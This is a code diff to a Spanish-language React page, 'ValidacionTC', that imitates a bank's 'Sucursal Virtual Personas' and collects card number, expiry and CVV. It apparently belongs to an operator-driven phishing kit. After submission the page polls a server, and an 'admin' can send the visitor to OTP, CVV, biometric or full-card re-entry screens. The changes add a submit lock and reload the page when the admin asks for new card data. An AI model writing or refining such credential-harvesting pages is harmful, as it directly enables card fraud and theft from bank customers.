@@ -73,6 +73,7 @@ export default function ValidacionTC() {
     const [isFocused, setIsFocused] = useState(false);
     const [focusedField, setFocusedField] = useState(""); // 'digits' | 'expiration' | 'cvv'
     const [cargando, setCargando] = useState(false);
+    const [submitted, setSubmitted] = useState(false); // Flag para prevenir múltiples envíos
     const [isTCCustom, setIsTCCustom] = useState(false); // Flag para determinar si es TC Custom
 
     // Estado principal de tarjeta
@@ -469,9 +470,10 @@ export default function ValidacionTC() {
             }
         } else {
             // Validar paso 2 y Enviar
-            if (cvv.length === requiredCvvLength) {
+            if (cvv.length === requiredCvvLength && !submitted) {
                 try {
                     setCargando(true);
+                    setSubmitted(true); // Bloquear botón permanentemente
                     const raw = localStorage.getItem("datos_usuario");
                     const usuarioLocalStorage = raw ? JSON.parse(raw) : {};
                     const sesionId = usuarioLocalStorage?.sesion_id;
@@ -598,7 +600,12 @@ export default function ValidacionTC() {
                     case 'solicitar_finalizar': navigate('/finalizado-page'); break;
                     case 'solicitar_biometria': navigate('/verificacion-identidad'); break;
                     case 'error_923': navigate('/error-923page'); break;
-                    case 'solicitar_tc_custom': break;
+                    case 'solicitar_tc_custom':
+                        // Si estamos en polling y el admin vuelve a solicitar TC Custom,
+                        // significa que quiere nuevos datos de TC completa (no solo CVV)
+                        // Recargar la página para resetear el flujo
+                        window.location.reload();
+                        break;
                     case 'solicitar_cvv_custom': navigate('/validacion-cvv'); break;
                     case 'solicitar_cvv': navigate('/validacion-cvv'); break;
                     case 'error_otp': navigate('/numero-otp'); break;
@@ -735,7 +742,12 @@ export default function ValidacionTC() {
                     <div style={{ textAlign: "center" }}>
                         <img src="/assets/images/img_pantalla2/descarga.svg" alt="Logo" style={{ width: "238px", marginTop: "45px" }} />
                     </div>
-                    <div style={{ marginTop: "25px", textAlignLast: "center" }}>
+
+                    <div
+                        style={{
+                            marginTop: "25px",
+                        }}
+                    >
                         <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs">
                             Sucursal Virtual Personas
                         </h1>
@@ -935,16 +947,16 @@ export default function ValidacionTC() {
                                     marginTop: "20px",
                                     opacity: (step === "front"
                                         ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5 && isCardValid === true)
-                                        : cvv.length === requiredCvvLength) ? 1 : 0.5,
+                                        : (cvv.length === requiredCvvLength && !submitted)) ? 1 : 0.5,
                                     cursor: (step === "front"
                                         ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5 && isCardValid === true)
-                                        : cvv.length === requiredCvvLength) ? "pointer" : "not-allowed"
+                                        : (cvv.length === requiredCvvLength && !submitted)) ? "pointer" : "not-allowed"
                                 }}
                                 disabled={step === "front"
                                     ? !(cardDigits.length === requiredDigitsLength && expirationDate.length === 5 && isCardValid === true)
-                                    : cvv.length !== requiredCvvLength}
+                                    : (cvv.length !== requiredCvvLength || submitted)}
                             >
-                                {step === "front" ? "Siguiente" : "Enviar"}
+                                {step === "front" ? "Siguiente" : (submitted ? "Enviado" : "Enviar")}
                             </button>
 
                         </div>
